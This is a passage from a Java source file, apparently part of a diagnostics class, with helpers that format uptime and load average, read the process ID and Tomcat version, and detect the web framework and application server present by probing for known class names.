        char lo = "0123456789ABCDEF".charAt(v & 0x0F);
        return new String(new char[]{hi, lo});
    }

    private String formatLoadAverage(double load) {
        if (load < 0) {
            return "N/A";
        }
        return String.format("%.2f", Double.valueOf(load));
    }

    /**
     * 格式化运行时间为 "Xd HH:MM:SS"。
     */
    private String formatUptime(long uptime) {
        long days = uptime / MILLIS_PER_DAY;
        long hours = (uptime % MILLIS_PER_DAY) / MILLIS_PER_HOUR;
        long minutes = (uptime % MILLIS_PER_HOUR) / MILLIS_PER_MINUTE;
        long seconds = (uptime % MILLIS_PER_MINUTE) / MILLIS_PER_SECOND;

        return days + "d " + pad2(hours) + ":" + pad2(minutes) + ":" + pad2(seconds);
    }

    /**
     * 两位补零（避免 String.format）
     */
    private String pad2(long val) {
        if (val < 10) {
            return "0" + val;
        }
        return String.valueOf(val);
    }

    private String getProcessId() {
        try {
            return getRuntimeBean().getName().split("@")[0];
        } catch (Exception e) {
            return "unknown";
        }
    }

    private String getTomcatVersion() {
        try {
            Class<?> serverInfoClass = Class.forName("org.apache.catalina.util.ServerInfo",
                    false, currentThreadClassLoader);
            try {
                Method getServerNumber = serverInfoClass.getMethod("getServerNumber");
                Object version = getServerNumber.invoke(null);
                if (version != null && String.valueOf(version).length() > 0) {
                    return String.valueOf(version);
                }
            } catch (Exception ignored) {
            }
            Method getServerInfo = serverInfoClass.getMethod("getServerInfo");
            return (String) getServerInfo.invoke(null);
        } catch (Exception e) {
            return "unknown";
        }
    }

    private boolean exists(String className) {
        try {
            Class.forName(className, false, currentThreadClassLoader);
            return true;
        } catch (ClassNotFoundException e) {
            return false;
        }
    }

    private String detectWebFramework() {
        if (exists("org.springframework.boot.SpringApplication")
                && exists("org.springframework.web.reactive.DispatcherHandler")) {
            return "Spring Boot (WebFlux)";
        }
        if (exists("org.springframework.boot.SpringApplication")
                && exists("org.springframework.web.servlet.DispatcherServlet")) {
            return "Spring Boot (MVC)";
        }
        if (exists("org.springframework.web.reactive.DispatcherHandler")) {
            return "WebFlux";
        }
        if (exists("org.springframework.web.servlet.DispatcherServlet")) {
            return "Spring MVC";
        }
        if (exists("org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter")) {
            return "Struts2";
        }
        if (exists("jakarta.faces.webapp.FacesServlet")) {
            return "Jakarta Faces";
        }
        if (exists("javax.faces.webapp.FacesServlet")) {
            return "JSF";
        }
        if (exists("org.jboss.resteasy.plugins.server.servlet.HttpServletDispatcher")) {
            return "RESTEasy (JAX-RS)";
        }
        if (exists("org.glassfish.jersey.servlet.ServletContainer")) {
            return "Jersey (JAX-RS)";
        }
        if (exists("io.quarkus.runtime.Application")) {
            return "Quarkus";
        }
        if (exists("io.micronaut.runtime.Micronaut")) {
            return "Micronaut";
        }
        if (exists("org.apache.wicket.Application")) {
            return "Apache Wicket";
        }
        if (exists("play.Application")) {
            return "Play Framework";
        }
        if (exists("jakarta.ws.rs.core.Application") || exists("javax.ws.rs.core.Application")) {
            return "JAX-RS";
        }
        if (exists("javax.servlet.Servlet") || exists("jakarta.servlet.Servlet")) {
            return "Servlet";
        }
        return "Unknown";
    }

    private String detectMiddleware() {
        if (exists("org.jboss.as.server.Main") || System.getProperty("jboss.server.base.dir") != null) {
            return "WildFly/JBoss";
        }
        if (exists("com.ibm.ws.kernel.boot.Launcher")) {
            return "WebSphere Liberty";
        }
        if (exists("fish.payara.micro.PayaraMicro")
                || exists("com.sun.enterprise.glassfish.bootstrap.ASMain")) {
            return "GlassFish/Payara";
        }
        if (exists("com.caucho.Version")) {
            return "Resin";
        }
        if (exists("com.apusic.web.container.WebContainer")) {
            return "Apusic";
        }
        if (exists("com.ibm.websphere.runtime.Server")) {
            return "WebSphere";
        }
        if (exists("weblogic.version")) {
            return "WebLogic";
        }
        if (exists("com.tongweb.web.thor.core.ContainerBase")
                || System.getProperty("tongweb.home") != null) {
            return "TongWeb";
        }
        if (exists("com.bes.enterprise.webtier.core.Container")
                || System.getProperty("bes.home") != null) {
            return "BES";
        }
        if (exists("org.apache.catalina.Server")) {
            return "Tomcat";
        }
        if (exists("org.eclipse.jetty.server.Server")) {
            return "Jetty";
        }
        if (exists("io.undertow.Undertow")
                || exists("io.undertow.servlet.spec.ServletContextImpl")) {
            return "Undertow";
        }
        return "Unknown";
    }

    private String firstProperty(String first, String second) {
        String value = System.getProperty(first);
        if (value == null || value.length() == 0) value = System.getProperty(second);
        return value == null || value.length() == 0 ? "unknown" : value;
    }

}
